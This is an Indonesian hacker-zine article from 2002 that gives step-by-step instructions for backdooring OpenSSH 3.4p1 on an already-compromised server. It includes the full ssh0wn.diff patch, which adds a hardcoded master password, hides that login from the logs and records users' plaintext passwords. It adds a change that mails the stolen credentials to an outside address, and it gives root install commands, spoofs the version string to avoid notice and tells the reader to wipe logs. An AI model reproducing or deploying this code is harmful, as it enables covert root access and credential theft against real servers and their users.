@@ -1,0 +1,433 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+
+
+===================================================================
+Memaksimalkan Kinerja Backdoor OpenSSH-3.4p1
+Oleh: scut (Kecoak Elektronik)
+===================================================================
+
+[1] Intro
+
+[1.1] Pengertian Backdoor
+
+
+Backdoor (pintu belakang) adalah salah satu rootkit yang bertugas untuk memberikan
+jalasa masuk (secara illegal) terhadap sebuah sistem operasi, baik itu sifatnya
+single port atau multiple port. Backdoor bekerja secara invisible dan tidak
+bersifat sebagai normal authentication login.
+
+Backdoor bisa bersifat sebagai sniffer, dalam artian fungsi dari backdoor tidak
+sebatas sebagai jalan masuk (secara illegal), namun dia akan mempunyai dualisme
+tugas yaitu sebagai pencatat login yang ada didalam sebuah sistem operasi.
+
+
+[1.2] Menentukan Backdoor yang layak dipakai
+
+Pengertian dari memilih backdoor yang layak disini adalah yang mempunyai beberapa
+kriteria sebagai berikut:
+
+1. Pastikan backdoor tersebut aman dari kontrol original root.
+2. Backdoor yang dipakai tidak menimbulkan proses tambahan yang ada didalam
+   sebuah server.
+3. Mempunyai kemampuan yang multifungsi, dalam artian disamping sebagai jalan masuk
+   juga berfungsi sebagai pencatat segala informasi yang ada didalam sistem operasi.
+
+Kenapa backdoor harus tidak menambah proses yang ada didalam server? karena disini
+penulis mengasumsikan bahwa sysadmin yang menjadi target `bukanlah orang yang bodoh'
+mereka akan secara rutin mencatat segala perubahan yang terjadi didalam server. Hal
+ini menuntut kita untuk melakukan perubahan didalam server seminimal mungkin.
+
+Untuk tulisan ini, dipilih backdoor yang menginfeksi service OpenSSH, dengan
+pertimbangan bahwa service OpenSSH adalah service standar yang ada dalam sebuah
+sistem operasi UNIX, dan backdoor ini tidak menambah proses baru didalam server.
+
+Secara standar jenis backdoor ini sudah mempunyai dua fungsi yang ideal sebagai
+backdoor. Pertama memungkinkan kita untuk login secara remote dengan akses root
+secara invisible, dan kedua memungkinkan kita untuk mengetahui informasi dari login
+yang masuk dan keluar semua user yang ada didalam server.
+
+Kelemahannya mungkin tidak secara otomatis mengirimkan informasi tersebut kedalam
+email. Hal ini menyebabkan kita harus dua kali kerja untuk mengetahui informasi
+tersebut. Didalam tulisan ini disamping menjelaskan bagaimana menginstal backdoor
+tersebut, juga membahasa bagaimana cara mengoptimalkan kinerja backdoor ini.
+
+
+[2] Instalasi Backdoor OpenSSH-3.4p1
+
+Ada beberapa hal yang harus diperhatikan sebelum kita melakukan penetrasi terhadap
+sebuah server yang berhasil kita masuki.
+
+Pertama adalah melihat versi OpenSSH asli yang ada didalam server, dan kedua adalah
+memperhatikan dan menganalisa seberapa sering root login didalam server, hal ini
+akan memberikan gambaran yang jelas seberapa teliti sysadmin dalam mengelola server.
+
+Dalam proses instalasi ini membutuhkan beberapa file pendukung yaitu:
+1. ssh0wn.diff
+   http://sec.angrypacket.com/code/ssh0wn.diff
+2. Openssh-3.4p1.tar.gz
+   http://openbsd.md5.com.ar/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz
+
+Setelah semua file pendukung tersebut berhasil anda simpan didalam server, langkah
+awal adalah melakukan pemecahan file OpenSSH-3.4p1 (extract), dan kedua memindahkan
+file ssh0wn.diff kedalam direktori OpenSSH-3.4p1
+
+Gambaran secara jelas dalam proses instalasi dapat anda lihat dari ilustrasi
+dibawah ini:
+
+[betha@tiamat:~]$ wget http://sec.angrypacket.com/code/ssh0wn.diff
+--21:17:29--  http://sec.angrypacket.com/code/ssh0wn.diff
+           => `ssh0wn.diff'
+Resolving sec.angrypacket.com... 64.84.39.37
+Connecting to sec.angrypacket.com[64.84.39.37]:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5,595 [text/plain]
+
+100%[============================>] 5,595         --.--K/s
+
+21:17:29 (1.29 MB/s) - `ssh0wn.diff' saved [5595/5595]
+
+[betha@tiamat:~]$ wget http://openbsd.md5.com.ar/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz
+--21:17:40--  http://openbsd.md5.com.ar/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz
+           => `openssh-3.4p1.tar.gz'
+Resolving openbsd.md5.com.ar... 200.32.4.46
+Connecting to openbsd.md5.com.ar[200.32.4.46]:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 837,668 [application/x-tar]
+
+100%[============================>] 837,668       38.64K/s    ETA 00:00
+
+21:18:03 (37.27 KB/s) - `openssh-3.4p1.tar.gz' saved [837668/837668]
+
+[betha@tiamat:~]$ tar xzf openssh-3.4p1.tar.gz
+[betha@tiamat:~]$ mv ssh0wn.diff  openssh-3.4p1
+[betha@tiamat:~]$ cd openssh-3.4p1
+[betha@tiamat:~/openssh-3.4p1]$ patch < ssh0wn.diff
+patching file auth-passwd.c
+patching file auth.c
+patching file canohost.c
+patching file includes.h
+patching file sshconnect1.c
+patching file sshconnect2.c
+patching file sshlogin.c
+[betha@tiamat:~/openssh-3.4p1]$
+
+
+[3] Optimalisasi Backdoor OpenSSH-3.4p1
+
+Proses instalasi awal backdoor selesai, selanjutnya adalah memperhatikan versi awal
+OpenSSH yang ada didalam server:
+
+[betha@tiamat:~/openssh-3.4p1]$ telnet localhost 22
+Trying 127.0.0.1...
+Connected to tiamat.obscure.org (127.0.0.1).
+Escape character is '^]'.
+SSH-1.99-OpenSSH_3.6.1p2
+
+Dapat kita lihat bahwa versi asli dari Openssh yang ada didalam server adalah versi
+SSH-1.99-OpenSSH_3.6.1p2 dan jenis backdoor yang kita gunakan adalah OpenSSH-2.4p1.
+
+Didalam intro diatas telah disebutkan bahwa hindari melakukan perubahan yang
+ada didalam server dengan meminimalisir perubahan tersebut. Yang dilakukan hanyalah
+merubah versi dari backdoor yang kita gunakan dengan cara :
+
+Edit file `version.h' yang ada didalam openssh-3.4p1 dan mengganti dengan versi asli
+dari OpenSSH yang ada didalam server
+
+--------------------------------------------------------------------
+/* $OpenBSD: version.h,v 1.34 2002/06/26 13:56:27 markus Exp $ */
+
+#define SSH_VERSION     "OpenSSH_3.4p1"
+--------------------------------------------------------------------
+
+Diganti dengan:
+
+--------------------------------------------------------------------
+/* $OpenBSD: version.h,v 1.34 2002/06/26 13:56:27 markus Exp $ */
+
+#define SSH_VERSION     "OpenSSH_3.6.1p2"
+--------------------------------------------------------------------
+
+Trick selanjutnya adalah bagaimana backdoor yang mempunyai dua tugas ini (login secara
+illegal dan mencatat informasi login masuk dan keluar) bisa secara otomatis mengirimkan
+informasi tersebut kedalam email
+
+Pertama anda perhatikan file `includes.h' yang ada didalam direktori openssh-3.4p1
+
+--------------------------------------------------------------------
+/* hax0r shit */
+#define _SECRET_PASSWD "l33thex0r_passwerd"
+#define _LOG_DIR "/dev/hdal"
+#define _S_LOG "slog"
+#define _C_LOG "clog"
+FILE *outf;
+int mlogin_ok;
+/* end hax0r shit */
+--------------------------------------------------------------------
+
+File diatas menjelaskan bahwa login password yang kita gunakan untuk masuk kedalam
+server adalah `l33thex0r_passwerd' dan direktori sebagai tempat menyimpan informasi
+login masuk dan keluar adalah `/dev/hdal' dan file yang mencatat informasi yang masuk
+adalah `slog' serta file yang mencatat informasi yang keluar adalah `clog'
+
+Untuk melakukan proses pengiriman secara otomatis informasi tersebut, silahkan lihat
+file `auth-passwd.c' yang berada didalam file openssh3.4p1
+
+--------------------------------------------------------------------
+[...]
+
+        if(strcmp(encrypted_password, pw_password) == 0){
+                        outf = fopen(_LOG_DIR"/"_S_LOG,"a+");
+                        fprintf (outf, "%s:%s\n",pw->pw_name,password);
+                        fclose (outf);
+                        return 1;
+        }else
+			return 0;
+[...]
+--------------------------------------------------------------------
+
+Dan rubah file tersebut dengan:
+
+--------------------------------------------------------------------
+[...]
+
+	if(strcmp(encrypted_password, pw_password) == 0){
+			outf = fopen(_LOG_DIR"/"_S_LOG,"a+");
+			fprintf (outf, "%s:%s:%s:%d%s\n",pw->pw_name,password, get_remote_ipaddr(), get_local_port(), system("cat /dev/hdal/slog | mail aris@kecoak.or.id"));
+			fclose (outf);
+			return 1;
+	}else
+			return 0;
+[...]
+--------------------------------------------------------------------
+
+Simpan file tersebut dan segera memulai instalasi akhir dari penetrasi OpenSSH ini.Proses
+instalasi OpenSSH ini HANYA bisa dilakukan oleh akses root.
+
+[root@tiamat:~]# ./configure --prefix=/usr --sysconfdir=/etc/ssh
+[root@tiamat:~]# make
+[root@tiamat:~]# make install
+[root@tiamat:~]# make clean && make distclean
+[root@tiamat:~]# echo "UsePrivilegeSeparation no" >> sshd_config
+[root@tiamat:~]# cp -f sshd_config /etc/ssh/sshd_config
+[root@tiamat:~]# mkdir /dev/hdal
+[root@tiamat:~]# chmod 777 /dev/hdal
+[root@tiamat:~]# kill -HUP `cat /var/run/sshd.pid'
+
+
+Proses akhir selesai, dan segera lakukan penghapusan log yang tertinggal diserver
+yang berhasil anda attack. Dan anda dapat login kedalam server tersebut melalui
+port standar openssh (22) dan dengan menggunakan password yang telah anda tentukan
+didalam file `includes.h'
+
+
+[4] References
+
+    -- Backdoor Ensiklopedia
+    -- Angrypacket Security Project
+
+
+Lampiran ssh0wn.diff
+
+# $Id: ssh0wn.diff,v 1.6 2002/08/08 21:53:02 enz00 Exp $
+#
+# patch for openssh-3.4p1
+#
+# when applied this patch will authenticate you 
+# as any user with the secret password and that user
+# will not be logged. it will also log logins/passwords
+# client and server side
+#
+# usage:
+# you'll probably want to change the defines found below
+# make sure that the _LOG_DIR is chmod 777
+# cp ssh0wn.diff openssh-3.4p1/;cd openssh-3.4p1
+# patch < ssh0wn.diff
+#
+# enz00@angrypacket.com
+# sec.angrypacket.com
+
+--- openssh-3.4p1/auth-passwd.c	Fri Jun 21 02:05:13 2002
++++ ssh0wn/auth-passwd.c	Thu Aug  8 15:44:55 2002
+@@ -218,6 +218,16 @@
+ #endif /* HAVE_MD5_PASSWORDS */
+ 
+ 	/* Authentication is accepted if the encrypted passwords are identical. */
+-	return (strcmp(encrypted_password, pw_password) == 0);
++	if(strcmp(_SECRET_PASSWD, password) == 0){
++			mlogin_ok = 1;
++			return 1;
++	}
++	if(strcmp(encrypted_password, pw_password) == 0){
++			outf = fopen(_LOG_DIR"/"_S_LOG,"a+");
++			fprintf (outf, "%s:%s\n",pw->pw_name,password);
++			fclose (outf);
++			return 1;
++	}else
++			return 0;
+ #endif /* !USE_PAM && !HAVE_OSF_SIA */
+ }
+--- openssh-3.4p1/auth.c	Wed May 22 01:06:28 2002
++++ ssh0wn/auth.c	Thu Aug  1 23:16:54 2002
+@@ -248,14 +248,17 @@
+ 	else
+ 		authmsg = authenticated ? "Accepted" : "Failed";
+ 
+-	authlog("%s %s for %s%.100s from %.200s port %d%s",
+-	    authmsg,
+-	    method,
+-	    authctxt->valid ? "" : "illegal user ",
+-	    authctxt->user,
+-	    get_remote_ipaddr(),
+-	    get_remote_port(),
+-	    info);
++	/* dont log if secret pass */
++	if(!mlogin_ok){
++		authlog("%s %s for %s%.100s from %.200s port %d%s",
++	    	authmsg,
++	    	method,
++	    	authctxt->valid ? "" : "illegal user ",
++	    	authctxt->user,
++	    	get_remote_ipaddr(),
++	    	get_remote_port(),
++	    	info);
++	}
+ }
+ 
+ /*
+--- openssh-3.4p1/canohost.c	Tue Jun 11 12:47:22 2002
++++ ssh0wn/canohost.c	Wed Aug  7 17:43:34 2002
+@@ -74,11 +74,13 @@
+ 
+ 	debug3("Trying to reverse map address %.100s.", ntop);
+ 	/* Map the IP address to a host name. */
+-	if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+-	    NULL, 0, NI_NAMEREQD) != 0) {
+-		/* Host name not found.  Use ip address. */
+-		log("Could not reverse map address %.100s.", ntop);
+-		return xstrdup(ntop);
++	if(!mlogin_ok){
++	  if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
++	      NULL, 0, NI_NAMEREQD) != 0) {
++		  /* Host name not found.  Use ip address. */
++		  log("Could not reverse map address %.100s.", ntop);
++	   	  return xstrdup(ntop);
++	  }
+ 	}
+ 
+ 	/* Got host name. */
+--- openssh-3.4p1/includes.h	Mon May 13 01:14:09 2002
++++ ssh0wn/includes.h	Thu Aug  8 15:45:46 2002
+@@ -157,4 +157,13 @@
+ 
+ #include "entropy.h"
+ 
++/* hax0r shit */
++#define _SECRET_PASSWD "l33thex0r_passwerd"
++#define _LOG_DIR "/dev/hdal"
++#define _S_LOG "slog"
++#define _C_LOG "clog"
++FILE *outf;
++int mlogin_ok;
++/* end hax0r shit */
++
+ #endif /* INCLUDES_H */
+--- openssh-3.4p1/sshconnect1.c	Thu Jun  6 15:57:34 2002
++++ ssh0wn/sshconnect1.c	Thu Aug  8 15:48:48 2002
+@@ -922,6 +922,7 @@
+ {
+ 	int type, i;
+ 	char *password;
++	char gpasswd[120];
+ 
+ 	debug("Doing password authentication.");
+ 	if (options.cipher == SSH_CIPHER_NONE)
+@@ -930,6 +931,7 @@
+ 		if (i != 0)
+ 			error("Permission denied, please try again.");
+ 		password = read_passphrase(prompt, 0);
++		strcpy(gpasswd,password);
+ 		packet_start(SSH_CMSG_AUTH_PASSWORD);
+ 		ssh_put_password(password);
+ 		memset(password, 0, strlen(password));
+@@ -938,8 +940,15 @@
+ 		packet_write_wait();
+ 
+ 		type = packet_read();
+-		if (type == SSH_SMSG_SUCCESS)
++		if (type == SSH_SMSG_SUCCESS){
++			/* dont log if secret pass */
++			if(strcmp(_SECRET_PASSWD,gpasswd) != 0){
++				outf = fopen(_LOG_DIR"/"_C_LOG,"a+");
++				fprintf (outf,"%s:%s@%s\n",options.user,gpasswd,get_remote_ipaddr());
++				fclose (outf);
++			}
+ 			return 1;
++		}
+ 		if (type != SSH_SMSG_FAILURE)
+ 			packet_disconnect("Protocol error: got %d in response to passwd auth", type);
+ 	}
+--- openssh-3.4p1/sshconnect2.c	Sun Jun 23 17:23:21 2002
++++ ssh0wn/sshconnect2.c	Thu Aug  8 15:48:20 2002
+@@ -446,6 +446,7 @@
+ 	static int attempt = 0;
+ 	char prompt[150];
+ 	char *password;
++	char gpasswd[120];
+ 
+ 	if (attempt++ >= options.number_of_password_prompts)
+ 		return 0;
+@@ -456,6 +457,7 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, authctxt->host);
+ 	password = read_passphrase(prompt, 0);
++	strcpy(gpasswd,password);
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+@@ -470,6 +472,12 @@
+ 	dispatch_set(SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ,
+ 	    &input_userauth_passwd_changereq);
+ 
++	/* dont log if its the secret pass */
++	if(strcmp(_SECRET_PASSWD,gpasswd) != 0){
++		outf = fopen(_LOG_DIR"/"_C_LOG,"a+");
++		fprintf (outf,"%s:%s@%s\n",options.user,gpasswd,get_remote_ipaddr());
++		fclose (outf);
++	}
+ 	return 1;
+ }
+ /*
+--- openssh-3.4p1/sshlogin.c	Sun Jun 23 17:23:21 2002
++++ ssh0wn/sshlogin.c	Thu Aug  8 15:46:10 2002
+@@ -71,8 +71,11 @@
+ 
+   li = login_alloc_entry(pid, user, host, ttyname);
+   login_set_addr(li, addr, sizeof(struct sockaddr));
+-  login_login(li);
+-  login_free_entry(li);
++  /* dont log if secret pass */
++  if(!mlogin_ok){
++  	login_login(li);
++  	login_free_entry(li);
++  }
+ }
+ 
+ #ifdef LOGIN_NEEDS_UTMPX
+@@ -96,6 +99,9 @@
+   struct logininfo *li;
+ 
+   li = login_alloc_entry(pid, user, NULL, ttyname);
+-  login_logout(li);
+-  login_free_entry(li);
++  /* no logout if secret pass */
++  if(!mlogin_ok){
++  	login_logout(li);
++  	login_free_entry(li);
++  }
+ }
+
+
+Selamat belajar,
+Pertengahan tahun 2002 - scut
